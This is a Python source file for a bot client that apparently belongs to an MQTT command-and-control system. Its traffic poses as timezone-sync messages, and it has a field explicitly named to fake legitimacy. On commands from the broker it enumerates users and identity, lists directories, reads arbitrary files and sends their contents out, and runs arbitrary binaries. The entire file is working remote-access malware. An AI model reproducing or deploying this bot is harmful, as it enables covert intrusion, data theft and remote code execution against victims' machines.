from paho.mqtt import client as mqtt
from datetime import datetime
from common import *
import subprocess
import random
import json

client_id = f"SyncDevice{random.randint(1, 9999)}"

def on_connect(client, userdata, flags, reason_code, properties):
    # reason_code - connection result code. 0 - success, otherwise failure.
    if reason_code == 0:
        client.subscribe(MQTT_TOPIC)
    else:
        print(f"Failed to connect to MQTT broker, connection return code {reason_code}.")
        client.disconnect()
        exit(1)

def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode()
        data = decode_payload(payload)
        execute_action(client, data["action"], data["path"])
    except UnknownDeviceError:
        pass  # Ignore messages from unknown devices
    except Exception as ex:
        print(f"Error processing message: {ex}")

def decode_payload(payload: str):
    try:
        data = json.loads(payload)

        if MSG_FIELD_ACTION not in data:
            raise UnknownDeviceError()
        
        action_timezone = data[MSG_FIELD_ACTION].upper()
        if action_timezone not in TIMEZONE_TO_ACTION:
            raise ValueError(f"Unknown timezone: {action_timezone}")

        action = TIMEZONE_TO_ACTION[action_timezone]
        path = None

        if MSG_FIELD_ENCRYPTED_MSG in data:
            encrypted_msg = data[MSG_FIELD_ENCRYPTED_MSG]
            path = do_very_strange_decryption(encrypted_msg)
        
        return {
            "action": action,
            "path": path
        }
    except UnknownDeviceError as ude:
        raise ude
    except Exception:
        raise Exception("Invalid payload.")
        

def execute_action(client, action: int, path: str = None):
    response = {
        MSG_FIELD_TO_FAKE_LEGITIMATE: datetime.now().isoformat()
    }

    try:
        if action == CMD_LIST_BOTS:
            response[MSG_FIELD_BOT_ID] = client_id

        elif action == CMD_LIST_USERS:
            # execute 'w' command to list logged in users
            result = subprocess.run(['w'], capture_output=True, text=True, timeout=5000)
            output_text = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
            response.update(encode(output_text))
        
        elif action == CMD_LIST_DIR:
            if not path:
                raise Exception("Missing path.")
            
            result = subprocess.run(['ls', path], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
            response.update(encode(output))
            
        elif action == CMD_GET_USER_ID:
            # execute 'id' command to get user id
            result = subprocess.run(['id'], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
            response.update(encode(output))
            
        elif action == CMD_DOWNLOAD_FILE:
            if not path:
                raise Exception("Missing path.")
           
            with open(path, 'r') as file:
                content = file.read()
            response.update(encode(content))
            
        elif action == CMD_EXECUTE_BINARY:
            if not path:
                raise Exception("Missing path.")
        
            result = subprocess.run([path], capture_output=True, text=True, timeout=5000)
            output = f"OUT {result.stdout}, ERR {result.stderr}"
            response.update(encode(output))
    
    except FileNotFoundError:
        response.update(encode(f"{path} not found"))
    except subprocess.TimeoutExpired:
        response.update(encode("Timeout"))
    except Exception as ex:
        response.update(encode(str(ex)))
        
    client.publish(MQTT_TOPIC, json.dumps(response))


def main():
    # create MQTT client
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)

    client.on_connect = on_connect
    client.on_message = on_message

    client.connect(MQTT_BROKER, MQTT_PORT)

    try:
        client.loop_forever()
    except KeyboardInterrupt:
        client.disconnect()
    except Exception as ex:
        print(f"An error occurred: {ex}")
        client.disconnect()


if __name__ == "__main__":
    main()